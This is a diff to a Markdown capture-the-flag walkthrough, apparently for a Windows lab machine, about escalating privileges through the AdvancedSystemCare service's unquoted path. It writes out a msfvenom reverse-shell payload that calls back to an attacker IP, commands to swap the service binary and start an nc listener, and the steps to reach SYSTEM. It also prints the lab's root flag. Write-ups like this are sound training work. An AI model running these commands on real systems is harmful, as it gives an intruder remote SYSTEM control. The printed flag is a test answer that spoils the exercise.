@@ -80,10 +80,26 @@ Check          : Unquoted Service Paths
 
 - The *PowerUp* scan results show that the service can be restarted, and the path can be edited
 - Generate shellcode to replace legitimate binary
-    - `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=4562 -e x86/shikata_ga_nai -f exe-service -o s.exe`
-- Use the cmdlet listed in *AbuseFunction* section of the scan results to replace legitimate binary with malicious shellcode
-    - `Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ASCService.exe"`
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.201.67.109 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
+- Kill the powershell channel with *ctrl+c*
+- Use <code>upload *local path to*\ASCService.exe</code> in meterpreter shell
+- `shell` to drop into cmd shell
+- Kill and replace existing service
+    - `sc stop AdvancedSystemCareService9` to kill service
+    - `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\"` and confirm replacement of the original ASCService.exe
 - Set up listener on attacker machine
-    - `nc -lvnp 4562`
+    - `nc -lvnp 4443`
+- Start malicious process on target machine
+    - `sc start AdvancedSystemCareService9`
 - Restarting the service on target machine should send a reverse shell to the port specified in the malicious ASCService.exe
+- Within the reverse shell, find and print the root flag
+    - `whoami` to confirm SYSTEM status
+    - `dir /s root.txt` to locate the flag file
+    - cd `C:\Users\Administrator\Desktop` and `type root.txt` to get the flag
+
+> <details><summary>The root flag of this machine is </summary>9af5f314f57607c00fd09803a587db80</details>
+
+## Access and Escalation without Metasploit
+
+- Use [this](https://www.exploit-db.com/exploits/39161) exploit for initial access to target machine
 
